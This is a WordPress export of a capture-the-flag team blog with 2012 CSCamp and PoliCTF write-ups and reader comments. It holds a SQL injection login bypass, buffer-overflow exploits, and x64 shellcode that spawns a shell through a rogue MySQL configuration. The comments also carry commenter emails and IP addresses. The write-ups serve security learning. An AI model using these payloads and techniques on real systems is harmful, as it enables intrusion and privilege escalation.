		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>7</wp:comment_id>
			<wp:comment_author><![CDATA[ateev]]></wp:comment_author>
			<wp:comment_author_email>ateev@live.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>14.99.154.7</wp:comment_author_IP>
			<wp:comment_date>2012-11-04 02:44:28</wp:comment_date>
			<wp:comment_date_gmt>2012-11-03 18:44:28</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[How to get the source code...  like in the pic 1. I tried http://jsbeautifier.org/..  but thats not very clean as yours..  Please help]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>8</wp:comment_id>
			<wp:comment_author><![CDATA[amon]]></wp:comment_author>
			<wp:comment_author_email>jergorn93@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>202.156.8.15</wp:comment_author_IP>
			<wp:comment_date>2012-11-04 13:47:16</wp:comment_date>
			<wp:comment_date_gmt>2012-11-04 05:47:16</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[You mean the code sample 1? I used Python to convert the escaped unicode to readable ascii, then put it in jsbeautifier.org to format the mess nicely, then read and edited the code to make more improvements.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>7</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>9</wp:comment_id>
			<wp:comment_author><![CDATA[ateev]]></wp:comment_author>
			<wp:comment_author_email>ateev@live.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>27.251.145.35</wp:comment_author_IP>
			<wp:comment_date>2012-11-04 16:43:33</wp:comment_date>
			<wp:comment_date_gmt>2012-11-04 08:43:33</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[can you please share the python script.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>8</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>10</wp:comment_id>
			<wp:comment_author><![CDATA[amon]]></wp:comment_author>
			<wp:comment_author_email>jergorn93@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>202.156.8.15</wp:comment_author_IP>
			<wp:comment_date>2012-11-04 17:12:28</wp:comment_date>
			<wp:comment_date_gmt>2012-11-04 09:12:28</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[It's just unicode escaped. Just put it in a string and print.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>9</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>CSCamp 2012 - Web 100</title>
		<link>http://nandynarwhals.org/2012/11/13/cscamp-2012-web-100/</link>
		<pubDate>Mon, 12 Nov 2012 19:26:08 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=201</guid>
		<description></description>
		<content:encoded><![CDATA[This challenge required you to log in as any valid account.

Attempting the standard sql injection login bypass yielded an error:

[sql]
' or 1=1; -- 
[/sql]

The error message showed that the escape was a simple prepend "\" to any "'" found in the string.

We can work around this by ensuring that the backslash is escaped by another backslash when the filter is applied:

[sql]
\' or 1=1; -- 
[/sql]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>201</wp:post_id>
		<wp:post_date>2012-11-13 03:26:08</wp:post_date>
		<wp:post_date_gmt>2012-11-12 19:26:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>cscamp-2012-web-100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cscamp"><![CDATA[CSCamp]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>CSCamp 2012 – Web 200</title>
		<link>http://nandynarwhals.org/2012/11/13/cscamp-2012-web-200/</link>
		<pubDate>Mon, 12 Nov 2012 19:34:05 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=208</guid>
		<description></description>
		<content:encoded><![CDATA[In this puzzle, you had to evaluate an equation encoded in base64 in an array structure consisting of values and operands hidden in a custom header. The objective is to return the results of the evaluation in a timely manner.

The exploit (solvew200.py):

[python]
import requests, base64, re

def main():
    chalurl = "http://176.9.193.13/ASmallCalculationChal411A784Y.php"
    chal_r = requests.get(chalurl)
    cookie = chal_r.cookies['x0x']
    eq = chal_r.headers['Eq']
    print "Got page (cookies: %s)" % cookie

    eq_l = base64.decodestring(eq)

    r=re.compile("(\d) => \'?(.+?)\'?,")
    eq_d = dict((int(i), v) for i,v in r.findall(eq_l))
    print "".join(eq_d.values())
    toexec = "total=%s" % "".join(eq_d.values()) 
    exec toexec in globals(), locals()


    print "Total is %d." % total
    cookies = dict(x0x=cookie)
    payload = {'result': str(total)}
    chal_p = requests.post(chalurl, data=payload, cookies=cookies)
    print chal_p.text
    
if __name__ == "__main__":
    main()
[/python]

TODO: Update with demonstration of script once tasks are online.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>208</wp:post_id>
		<wp:post_date>2012-11-13 03:34:05</wp:post_date>
		<wp:post_date_gmt>2012-11-12 19:34:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>cscamp-2012-web-200</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cscamp"><![CDATA[CSCamp]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>CSCamp 2012 - Web 300</title>
		<link>http://nandynarwhals.org/2012/11/13/cscamp-2012-web-300/</link>
		<pubDate>Mon, 12 Nov 2012 19:39:30 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=210</guid>
		<description></description>
		<content:encoded><![CDATA[In this challenge, an image divided into blocks has its blocks scrambled not unlike a sliding block puzzle (http://en.wikipedia.org/wiki/Sliding_puzzle). The objective is to rearrange the blocks to form the correct image and submit the correct order to the server.

Our first task is to obtain the constituent parts of the image, sort them and then compare the differences between our sorted blocks and the ones received.

Here is the exploit (solvew300.py):<!--more-->

[python]
from PIL import Image
import ImageChops
import math, operator
import requests

def main():
# new image
url = "http://176.9.193.13/CxliTo3-ra/image.php"
r = requests.get(url)
cookie = r.cookies['x0x']
file("image.jpg", 'w').write(r.content) # we are lazy

# obtain winning combinations
im = Image.open("image.jpg")
im_list = []
for i in range(3):
for j in range(4):
im_list.append(im.crop((j*100, i*100, j*100+100, i*100+100)))

im_real_list = []
for i in range(12):
im_real_list.append(Image.open("parts/%s.png" % i)) # you require some work

l_order = {}
for i in range(len(im_list)):
for j in range(len(im_real_list)):
if rmsdiff_2011(im_list[i], im_real_list[j]) &lt; 600:
l_order[grab_fn(im_real_list[j])] = i
break

solution = ":".join(str(l_order[str(i)]) for i in range(12))

# send solution
url_s = "http://176.9.193.13/CxliTo3-ra/s.php"
payload = {"order": solution}
cookies = {'x0x': cookie}
r_s = requests.get(url_s, params=payload, cookies=cookies)
print r_s.text

def rmsdiff_2011(im1, im2):
# Shamefully stolen from http://code.activestate.com/recipes/577630-comparing-two-images/
# Thanks guy who posted cool code
"Calculate the root-mean-square difference between two images"
diff = ImageChops.difference(im1, im2)
h = diff.histogram()
sq = (value*(idx**2) for idx, value in enumerate(h))
sum_of_squares = sum(sq)
rms = math.sqrt(sum_of_squares/float(im1.size[0] * im1.size[1]))
return rms

def grab_fn(name):
return name.filename.replace("parts/", "").replace(".png", "")

if __name__ == "__main__":
main()
[/python]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>210</wp:post_id>
		<wp:post_date>2012-11-13 03:39:30</wp:post_date>
		<wp:post_date_gmt>2012-11-12 19:39:30</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>cscamp-2012-web-300</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cscamp"><![CDATA[CSCamp]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>CSCamp 2012 - Crypto 400</title>
		<link>http://nandynarwhals.org/2012/11/13/cscamp-2012-crypto-400/</link>
		<pubDate>Mon, 12 Nov 2012 19:41:10 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=212</guid>
		<description></description>
		<content:encoded><![CDATA[[python]
import re, requests, string

def main():
    print "Solver for CScamp Crypto 400"
    print "by amon\n"

    print "Decomposing raw crypto data..."
    parsed = parse_raw()
    print "Parsed data: %s." % "".join(i + ", " for i in parsed)[:-2]

    print "Working on grabbing keys using lowercase alpha set..."
    keyset = build_key()
    print "Keys retrieved."

    print "Decrypting parsed data with keyset..."
    print "Decrypted key is %s." % decrypt(parsed, keyset).upper() # the key is required in uppercase
    

def decrypt(parsed, key_dict):
    decrypt = ""
    for i in parsed:
        decrypt += key_dict[i]
    return decrypt

def build_key():
    
    def request_key(letter):
        url = "http://176.9.193.13/CrYpt0ch4l12554222426.php"
        payload = {'key': letter}
        r = requests.get(url, params=payload)
        p = re.compile("([01]{2})<br>([01]{2})<br>([01]{2})<br></div>")
        s = p.search(r.text)
        if s:
            key = "".join(i for i in s.groups()).encode("ascii", "ignore")
            print "%s: %s" % (letter, key)
            return key
        else:
            return None

    key_dict = {}
    for i in string.ascii_lowercase:
        key_dict[request_key(i)] = i

    return key_dict
    
    
def parse_raw():
    raw_search=["011001011001111010101010011111111110111101101110111010",
                "110010110010000010101010100101010011011011011100000101",
                "001110100010100010100010001000110010111010100000100011"
                ]

    # Assuming that there is no sequential rule for each character, we simply
    # extract the bits of a specific encoded letter through this scheme:
    # 01
    # 23
    # 45

    the_list = []
    for i in raw_search:
        em = [h+k for h,k in zip(i[0::2], i[1::2])]
        for j in range(len(em)):
            if len(the_list) < j + 1: the_list.append("")
            the_list[j] += em[j]
            
    return the_list



if __name__ == "__main__":
    main()
[/python]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>212</wp:post_id>
		<wp:post_date>2012-11-13 03:41:10</wp:post_date>
		<wp:post_date_gmt>2012-11-12 19:41:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>cscamp-2012-crypto-400</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cscamp"><![CDATA[CSCamp]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>CSCamp 2012 - Exploit 100</title>
		<link>http://nandynarwhals.org/2012/11/14/cscamp-2012-exploit-100/</link>
		<pubDate>Wed, 14 Nov 2012 13:25:15 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=216</guid>
		<description></description>
		<content:encoded><![CDATA[This was more of a reversing puzzle than an exploitation one. The binary accepts a parameter as a password. It checks if the password is correct and cats the key. If not, it tells you the key is wrong. The key is stored byte-by-byte in the program and is assembled dynamically during runtime. After assembly, it compares the supplied password with the one on its stack.

solvee100.py:

[python]
import struct, sys

def main():
    stack_dump = [0x38343664, 0x39366537, 0x64386562, 0x00313538]
    ans = ""
    
    for i in stack_dump:
        ans += struct.pack("I", i)

    sys.stdout.write(ans)

if __name__ == "__main__":
    main()
[/python]

Running this on our local machine:

[shell]
amon@Alyx:~/cscamp/exp100$ ./level100 
useage : ./level100  <password>
amon@Alyx:~/cscamp/exp100$ ./level100 wrongkey
Wrong key, try harder
amon@Alyx:~/cscamp/exp100$ ./level100 `python solvee100.py`
Congratulation, let me grab you content of key.txt
cat: ./key.txt: No such file or directory
amon@Alyx:~/cscamp/exp100$
[/shell]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>216</wp:post_id>
		<wp:post_date>2012-11-14 21:25:15</wp:post_date>
		<wp:post_date_gmt>2012-11-14 13:25:15</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>cscamp-2012-exploit-100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cscamp"><![CDATA[CSCamp]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>CSCamp 2012 - Exploit 200</title>
		<link>http://nandynarwhals.org/2012/11/14/cscamp-2012-exploit-200/</link>
		<pubDate>Wed, 14 Nov 2012 15:03:53 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=218</guid>
		<description></description>
		<content:encoded><![CDATA[This binary is vulnerable to a buffer overflow in the strncpy function called in the main function with user supplied input. It takes in two arguments, argument 1 being the offset of the address on the stack of the value to copy data from, and argument 2 being the number of bytes to copy. The size of the buffer being copied to is a maximum of 280 bytes. Since the binary has a function containing a call to system("cat key.txt"), we may simply replace the saved frame pointer with the function address.

[shell]
amon@Alyx:~/cscamp/exp200$ nm level200 
0000000000600e40 d _DYNAMIC
...
0000000000400654 T cat_key
...
0000000000400669 T main
...
                 U system@@GLIBC_2.2.5
[/shell]

Our address is 0x0000000000400654. We may craft the exploit now, knowing the offset of the saved frame pointer (%RSP+280), and the address of our cat_key. We simply need to copy more than 288 bytes (we choose 300 arbitrarily) from the 3rd argument offset in the stack, i.e. our third argument we pass.

[shell]
amon@Alyx:~/cscamp/exp200$ ./level200 3 300 `python -c 'print "A"*280 + "\x54\x06\x40\x00\x00\x00\x00\x00"'`
You entred : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT@
cat: ./key.txt: No such file or directory
Segmentation fault
amon@Alyx:~/cscamp/exp200$
[/shell]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>218</wp:post_id>
		<wp:post_date>2012-11-14 23:03:53</wp:post_date>
		<wp:post_date_gmt>2012-11-14 15:03:53</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>cscamp-2012-exploit-200</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cscamp"><![CDATA[CSCamp]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>CSCamp 2012 - Exploit 400</title>
		<link>http://nandynarwhals.org/2012/11/14/cscamp-2012-exploit-400/</link>
		<pubDate>Wed, 14 Nov 2012 15:31:49 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=220</guid>
		<description></description>
		<content:encoded><![CDATA[We solved the post-patch version of this binary.

Included with the binary was a mysqldb.conf connection configuration file for the binary to connect to a MySQL database in order to retrieve questions.

[text]
localhost
game_user
game_pass
game

[/text]

The binary does not specify an absolute path, so we may create a mysqldb.conf in our home directory and the binary will use ours. The question field returned will cause a buffer overflow if the length of the question is larger than the buffer.<!--more-->

The vulnerable code:

[text]
0000000000400dd4 :
400dd4: 55 push %rbp
400dd5: 48 89 e5 mov %rsp,%rbp
400dd8: 48 83 ec 10 sub $0x10,%rsp
400ddc: 48 89 7d f8 mov %rdi,-0x8(%rbp)
400de0: 48 89 75 f0 mov %rsi,-0x10(%rbp)
400de4: 48 8b 55 f0 mov -0x10(%rbp),%rdx
400de8: 48 8b 45 f8 mov -0x8(%rbp),%rax
400dec: 48 89 d6 mov %rdx,%rsi
400def: 48 89 c7 mov %rax,%rdi
400df2: e8 b1 fe ff ff callq 400ca8
400df7: c9 leaveq
400df8: c3 retq
[/text]

What we may do is setup a MySQL server to serve remote connections and replace the in-use configuration with our own.

[text]
db.nandynarwhals.org
game_burger
game_burger
game_burger

[/text]

Now we can create the required table with the following schema:

[sql]
create table questions (id integer primary key, Question varchar(2000) not null, Answer integer not null);
insert into questions values (1, \"How many world wars have there been?\", 2);\n"
[/sql]

We have written a python script to generate SQL code to populate the first entry with our exploit: a NOPsled with a x64 shellcode to setuid(1003) and then spawn /bin/sh.

[python]
import struct, sys

def main():
if len(sys.argv) &lt; 2:
print "Usage: python create_payload.py

<address>\n"
print " BE SURE TO CREATE TABLE WITH THE FOLLOWING FIRST:"
print " create table questions (id integer primary key, Question varchar(2000) not null, Answer integer not null);"
print " AND INSERT THE FOLLOWING DATA:"
print " insert into questions values (1, \"How many world wars have there been?\", 2);\n"
return</address>shellcode = "\xeb\x0b\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x90\x90\x90\x48\x31\xc0\x66\x83\xc0\x71\x48\x31\xff\x48\x31\xf6\x66\x81\xc7\xeb\x03\x66\xbe\xeb\x03\x0f\x05\x48\x31\xc0\x66\x83\xc0\x3b\x48\x8d\x3d\xcf\xff\xff\xff\x88\x67\x07\x48\x31\xf6\x48\x31\xd2\x0f\x05"
address = int(sys.argv[1], 16)
packed_address = struct.pack("Q", address);
padding = "\x90"*(408-len(shellcode))

payload = padding[:-10] + shellcode + padding[-10:] + packed_address

mysql_rules = "update questions set Question=CHAR(%s);" % ", ".join(str(ord(i)) for i in payload)

print mysql_rules

if __name__ == "__main__":
main()
[/python]

Running this script with the return address 0x7fffffffe520 on the stack within our NOPs.

[shell]
amon@Alyx:~/cscamp/exp400$ python create_payload.py
Usage: python create_payload.py

<address>BE SURE TO CREATE TABLE WITH THE FOLLOWING FIRST:
create table questions (id integer primary key, Question varchar(2000) not null, Answer integer not null);
AND INSERT THE FOLLOWING DATA:
insert into questions values (1, "How many world wars have there been?", 2);

amon@Alyx:~/cscamp/exp400$ python create_payload.py 0x7fffffffe520
update questions set Question=CHAR(144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 235, 11, 47, 98, 105, 110, 47, 115, 104, 78, 144, 144, 144, 72, 49, 192, 102,
131, 192, 113, 72, 49, 255, 72, 49, 246, 102, 129, 199, 235, 3, 102, 190, 235, 3, 15, 5, 72, 49, 192, 102, 131, 192,
59, 72, 141, 61, 207, 255, 255, 255, 136, 103, 7, 72, 49, 246, 72, 49, 210, 15, 5, 144, 144, 144, 144, 144, 144, 144,
144, 144, 144, 32, 229, 255, 255, 255, 127, 0, 0);
amon@Alyx:~/cscamp/exp400$
[/shell]

Now all we have to do is apply the SQL update on our fake database and then run the binary using a relative path with our modified mysqldb.conf in our directory.

[shell]
amon@Alyx:~/cscamp/exp400/exploit$ whoami
amon
amon@Alyx:~/cscamp/exp400/exploit$ ls
mysqldb.conf
amon@Alyx:~/cscamp/exp400/exploit$ ~/cscamp/exp400/level400
$ whoami
level3
$ cat key
[/shell]

</address>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>220</wp:post_id>
		<wp:post_date>2012-11-14 23:31:49</wp:post_date>
		<wp:post_date_gmt>2012-11-14 15:31:49</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>cscamp-2012-exploit-400</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cscamp"><![CDATA[CSCamp]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>PoliCTF 2012</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012/</link>
		<pubDate>Mon, 19 Nov 2012 05:32:23 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=226</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-102753.png"><img src="http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-102753.png" alt="" title="Screenshot at 2012-11-19 10:27:53" width="1004" height="686" class="alignnone size-full wp-image-227" /></a>

For this CTF, <a href="http://ctftime.org/team/1332/">Nandy Narwhals</a> and <a href="http://ctftime.org/team/3030/">Doz</a> (Denial of Zervice) teamed up to form <a href="http://ctftime.org/team/3129/">Singapore Group</a>, a collection of CTF teams located in Singapore.

We managed to solve four of the challenges:
1) bin-pwn100
2) binpwn-200
3) binpwn-400
4) grabbag-300

Our final place on the scoreboard was 19 with 1000 points.

[caption id="attachment_231" align="alignnone" width="976"]<a href="http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-132809.png"><img src="http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-132809.png" alt="" title="Screenshot at 2012-11-19 13:28:09" width="976" height="653" class="size-full wp-image-231" /></a> Singapore Group at 19th place.[/caption]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>226</wp:post_id>
		<wp:post_date>2012-11-19 13:32:23</wp:post_date>
		<wp:post_date_gmt>2012-11-19 05:32:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>polictf-2012</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="polictf"><![CDATA[polictf]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>PoliCTF 2012 - Grab Bag 300</title>
		<link>http://nandynarwhals.org/2012/11/19/polictf-2012-grab-bag-300/</link>
		<pubDate>Mon, 19 Nov 2012 06:38:48 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=234</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-135940.png"><img class="alignnone size-large wp-image-236" title="Screenshot at 2012-11-19 13:59:40" src="http://nandynarwhals.org/wp-content/uploads/2012/11/Screenshot-at-2012-11-19-135940-1024x575.png" alt="" width="584" height="327" /></a>
<blockquote>Find the key.

Attachment:a3f2816a38d4c46.tbz2.gpg (password: 509c0f5818f5f64c73f25db2aa2473dfa9591e33 )</blockquote>
In this challenge, we are given a HTML file with a picture of Mr Hankey, the Christmas Poo, and obfuscated javascript. Mr Hankey is the cleaner of the two. The objective is to deobfuscate the javascript and hopefully get a key. The original challenge html may be found here: <a href="http://nandynarwhals.org/wp-content/uploads/2012/11/challenge.html">challenge.html</a>.

We may isolate the javascript and beautify it like so:<!--more-->

[javascript]
eval(function (p, a, c, k, e, r) {
e = function (c) {
return (c &lt; a ? '' : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))
};
if (!''.replace(/^/, String)) {
while (c--) r[e(c)] = k[c] || e(c);
k = [function (e) {
return r[e]
}];
e = function () {
return '\\w+'
};
c = 1
};
while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
return p
}('5l(5g(p,a,c,k,e,r) ...
[/javascript]

If we look closely at the packed data, we can see that '(p,a,c,k,e,r)' signature repeats again. Expect some nesting. We may unpack this by replacing the first eval with print and run this in our rhino javascript engine. We then obtain a second level of packing.

[javascript]
eval(function (p, a, c, k, e, r) {
e = function (c) {
return (c &lt; a ? '' : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))
};
if (!''.replace(/^/, String)) {
while (c--) r[e(c)] = k[c] || e(c);
k = [function (e) {
return r[e]
}];
e = function () {
return '\\w+'
};
c = 1
};
while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
return p
}('34(2Q(p,a,c,k,e,r){e=2Q(33) ...
[/javascript]

Repeating this unpacking...

[javascript]
eval(function (p, a, c, k, e, r) {
e = function (duckrolled) {
return (c &lt; a ? '' : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))
};
if (!''.replace(/^/, String)) {
while (c--) r[e(c)] = k[c] || e(c);
k = [function (e) {
return r[e]
}];
e = function () {
return '\\w+'
};
c = 1
};
while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
return p
}('q A="";q M=0; ...
[/javascript]

Alright, this looks like it's the last level packing! (there isn't a packer signature in the payload.) Let's try to run this.

[shell]
amon@Alyx:~/polictf/grabbag300$ rhino unpack3.js
java.lang.StackOverflowError
